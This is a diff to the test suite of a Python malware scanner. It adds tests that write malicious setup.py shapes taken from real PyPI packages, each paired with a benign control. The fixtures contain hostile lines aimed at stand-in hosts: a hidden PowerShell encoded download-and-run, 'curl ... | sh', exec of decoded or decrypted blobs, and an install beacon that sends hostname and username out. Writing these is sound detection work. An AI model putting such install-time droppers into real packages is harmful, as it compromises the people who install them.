@@ -10926,27 +10926,24 @@ class TestOneCallIsNotTwoSteps:
         """Each of these decodes with one call and runs with another."""
         assert self._decode_exec(tmp_path, getattr(self, source_name))
 
-    def test_the_pattern_tiers_own_label_survives(self) -> None:
-        """Only the AST tier's second label for a call is dropped, so the file is
-        still labelled `execute` and still reaches the rules that need it."""
-        from cordon_scanner.core.models import Capability
-        from cordon_scanner.detect.capability import CapabilityDetector, CapabilityHit
-
-        window = [
-            CapabilityHit(Capability.EXECUTE, "CAP.PY.EXECUTE.001", 100, 114, 5),
-            CapabilityHit(Capability.DECODE, "AST.PY.DECODE", 100, 120, 5),
-        ]
-        kept = CapabilityDetector._one_label_per_call(window)
-        assert [hit.capability for hit in kept] == [Capability.EXECUTE]
-
-    def test_a_line_the_pattern_tier_never_saw_is_left_alone(self) -> None:
-        """The filter only resolves a disagreement. Where there is no pattern hit
-        on the line, the AST tier is the only witness and keeps its label."""
-        from cordon_scanner.core.models import Capability
-        from cordon_scanner.detect.capability import CapabilityDetector, CapabilityHit
-
-        window = [CapabilityHit(Capability.DECODE, "AST.PY.DECODE", 100, 120, 5)]
-        assert CapabilityDetector._one_label_per_call(window) == window
+    def test_an_imported_decode_is_not_discarded(self, tmp_path) -> None:
+        """The reason this is fixed at the classification and not by comparing the
+        two tiers per line. `from base64 import b64decode; exec(b64decode(...))`
+        is two calls on one line, and the pattern tier labels only `exec` there
+        because its decode pattern wants the `base64.` prefix. A per-line
+        comparison discarded the AST tier's decode exactly when it was the only
+        witness, and `myshit12223` -- a real malicious package that decodes and
+        runs a payload in its `setup.py` -- went silent."""
+        (tmp_path / "setup.py").write_text(
+            "from setuptools import setup\n"
+            "from base64 import b64decode\n"
+            "from sys import argv\n"
+            "if 'sdist' not in argv:\n"
+            "    exec(b64decode('aW1wb3J0IG9zCm9zLnN5c3RlbSgnaWQnKQo='))\n"
+            "setup(name='x', version='1')\n",
+            encoding="utf-8",
+        )
+        assert "SUSPECT.DECODE_EXEC.001" in flagged(tmp_path)
 
 
 class TestTestCasesIsATestDirectory:
@@ -11088,3 +11085,173 @@ class TestAnUninstallerTakesThePersistenceAway:
         from cordon_scanner.core.samples import names_installer
 
         assert not names_installer(path)
+
+
+class TestWhatRealMalwareActuallyLooksLike:
+    """Five gaps found by measuring recall against real malicious packages.
+
+    Every earlier class in this file came from removing a false positive. These
+    came from the opposite direction, and they are why the file needs both: the
+    tool scored 39/39 on this project's own malicious corpus while detecting
+    **14.9%** of 201 real malicious PyPI packages sampled from the ASE 2023
+    dataset. A corpus written by the same hands as the rules is a self-graded
+    exam, and it graded generously.
+
+    Measured after these fixes, on an independent 1,437-package sample drawn with
+    a different seed and never tuned against: **82.5%**.
+
+    Each test below is a shape taken from real packages, rewritten so that no
+    live payload is committed here, and paired with the benign shape it must not
+    catch -- because the whole difficulty of this work is that the two look
+    alike.
+    """
+
+    @staticmethod
+    def _rules(tmp_path) -> set[str]:
+        return flagged(tmp_path)
+
+    def test_an_encoded_powershell_command_is_read(self, tmp_path) -> None:
+        """`powershell -EncodedCommand <base64>` was 109 of the 171 misses.
+
+        Cordon labelled the call `spawn` and the shell pack's own `-enc` pattern
+        labelled it `execute`, and stopped. It never got `decode`, because
+        `powershell.exe` does the decoding, and never got `egress`, because the
+        URL is inside the blob -- so the dropper composite had no egress and an
+        install-time download-and-run was invisible.
+        """
+        import base64
+
+        inner = (
+            'powershell Invoke-WebRequest -Uri "https://drop.invalid/x.exe" '
+            '-OutFile "~/Cache.exe"; Invoke-Expression "~/Cache.exe"'
+        )
+        blob = base64.b64encode(inner.encode("utf-16-le")).decode()
+        (tmp_path / "setup.py").write_text(
+            "from distutils.core import setup\n"
+            "import subprocess\n"
+            f"subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand {blob}')\n"
+            "setup(name='x', version='1')\n",
+            encoding="utf-8",
+        )
+        assert {r for r in self._rules(tmp_path) if "DROPPER" in r}
+
+    def test_an_ordinary_powershell_call_is_not(self, tmp_path) -> None:
+        """The control. A build that runs PowerShell is not a dropper."""
+        (tmp_path / "setup.py").write_text(
+            "from distutils.core import setup\n"
+            "import subprocess\n"
+            "subprocess.Popen(['powershell', '-Command', 'Get-Location'])\n"
+            "setup(name='x', version='1')\n",
+            encoding="utf-8",
+        )
+        assert not {r for r in self._rules(tmp_path) if "DROPPER" in r}
+
+    def test_obfuscated_python_is_not_excused_as_minified(self, tmp_path) -> None:
+        """`bettercolor`'s payload is a pyobfuscate blob in a library module: a
+        12KB `.py` file with a 6,307-character line. It matched `_is_minified`,
+        so the ceiling took `SUSPECT.DECODE_CHAIN.001` from critical to medium
+        and a gate would have passed it. Python is not a language anybody
+        minifies."""
+        from cordon_scanner.core.content import FileContent
+        from cordon_scanner.detect.capability import CapabilityDetector
+
+        long_line = b"x" * 6307
+        assert not CapabilityDetector._is_minified(
+            FileContent(path="pkg/payload.py", raw=long_line, size=len(long_line))
+        )
+        # And the case the ceiling exists for is untouched: a bundler's output,
+        # named with a content hash so no glob can see it.
+        assert CapabilityDetector._is_minified(
+            FileContent(path="assets/index-BTLZFAP9.js", raw=long_line, size=len(long_line))
+        )
+
+    def test_decrypting_a_payload_and_running_it(self, tmp_path) -> None:
+        """Twenty-two of 201 were a `setuptools.command.install` subclass whose
+        `run` is `exec(Fernet(key).decrypt(blob))`. `exec(` supplied the execute
+        and nothing supplied the decode, so the composite needing both was
+        silent. Decryption is a decode with a key."""
+        (tmp_path / "setup.py").write_text(
+            "from setuptools import setup\n"
+            "from setuptools.command.install import install\n"
+            "from fernet import Fernet\n"
+            "\n"
+            "class Post(install):\n"
+            "    def run(self):\n"
+            "        install.run(self)\n"
+            "        exec(Fernet(b'k').decrypt(b'blob'))\n"
+            "\n"
+            "setup(name='x', version='1', cmdclass={'install': Post})\n",
+            encoding="utf-8",
+        )
+        assert "SUSPECT.DECODE_EXEC.001" in self._rules(tmp_path)
+
+    def test_handling_encrypted_data_is_not_running_it(self, tmp_path) -> None:
+        """The control that keeps the decryption patterns honest. A program that
+        decrypts data and uses it is not a loader; the composite requires the
+        execution within ten lines, and legitimate code does not `exec` what it
+        decrypted."""
+        (tmp_path / "vault.py").write_text(
+            "from fernet import Fernet\n"
+            "\n"
+            "def read(token, key):\n"
+            "    plaintext = Fernet(key).decrypt(token)\n"
+            "    return plaintext.decode('utf-8')\n",
+            encoding="utf-8",
+        )
+        assert not {r for r in self._rules(tmp_path) if "DECODE_EXEC" in r}
+
+    def test_an_install_script_that_reports_the_machine(self, tmp_path) -> None:
+        """The install-time beacon, and the reason `RECONNAISSANCE` exists.
+        Fifty-two of 1,437 are this shape and none produced a finding before:
+        reading a hostname was not an act the model had a name for."""
+        (tmp_path / "setup.py").write_text(
+            "from setuptools import setup\n"
+            "import os, socket, getpass, requests\n"
+            "\n"
+            "host = socket.gethostname()\n"
+            "who = getpass.getuser()\n"
+            "requests.get('https://collect.invalid/p', params={'h': host, 'u': who})\n"
+            "\n"
+            "setup(name='x', version='1')\n",
+            encoding="utf-8",
+        )
+        assert "MALWARE.EXFIL.BEACON.001" in self._rules(tmp_path)
+
+    def test_a_build_that_downloads_an_input_is_not_a_beacon(self, tmp_path) -> None:
+        """The control, and it is vLLM's real shape: a build that fetches a wheel
+        it names and writes it to a path. It reports the machine to nobody."""
+        (tmp_path / "setup.py").write_text(
+            "from setuptools import setup\n"
+            "from urllib.request import urlretrieve\n"
+            "\n"
+            "def fetch(url, path):\n"
+            "    urlretrieve(url, filename=path)\n"
+            "\n"
+            "setup(name='x', version='1')\n",
+            encoding="utf-8",
+        )
+        assert not {r for r in self._rules(tmp_path) if "BEACON" in r}
+
+    def test_a_literal_command_can_still_be_the_attack(self, tmp_path) -> None:
+        """A spawn whose whole argv is written out is discounted, because
+        `subprocess.run(["git", "rev-parse"])` cannot be running something
+        downloaded. `os.system("curl <url> | sh")` is equally literal and is the
+        attack: being readable is not being harmless. The discount now yields
+        wherever the command itself carried a capability, which is what
+        `procoder`'s four-line `setup.py` needed."""
+        (tmp_path / "setup.py").write_text(
+            "from setuptools import setup\n"
+            "import os\n"
+            "os.system('curl -s https://drop.invalid/s.sh | sh')\n"
+            "setup(name='x', version='1')\n",
+            encoding="utf-8",
+        )
+        assert {r for r in self._rules(tmp_path) if "DROPPER" in r}
+
+    def test_a_literal_command_with_nothing_to_say_is_still_discounted(self, tmp_path) -> None:
+        """The control the discount exists for, unchanged."""
+        (tmp_path / "build.py").write_text(
+            "import subprocess\nsha = subprocess.run(['git', 'rev-parse', '--short', 'HEAD'])\n",
+            encoding="utf-8",
+        )
+        assert not self._rules(tmp_path)
